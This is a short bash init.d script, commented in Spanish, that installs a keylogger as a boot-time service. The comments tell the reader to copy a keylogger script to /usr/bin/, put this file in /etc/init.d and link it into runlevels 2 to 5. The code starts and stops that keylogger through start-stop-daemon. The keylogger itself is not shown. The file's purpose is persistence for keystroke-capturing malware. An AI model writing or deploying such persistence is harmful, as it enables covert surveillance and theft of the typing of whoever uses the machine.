#!/bin/bash

:<<EOF
	el script del keylogger hay q copiarlo en /usr/bin/

	copiar este fichero de configuracion en /etc/init.d
	despues crear un soft-link al mismo en los directorios /etc/rc{2,3,4,5}.d/
	(runlevels por defecto, todos son identicos al 2)
EOF

[ ! -x /usr/bin/keylogger_bash.sh ] && exit 0

case "$1" in 
	"start")
		start-stop-daemon --start --quiet --oknodo --exec /usr/bin/keylogger_bash.sh
		;;
	"stop")
		kill -s SIGTERM `ps -C keylogger_bash.sh -o pid --no-headers`
		;;
esac
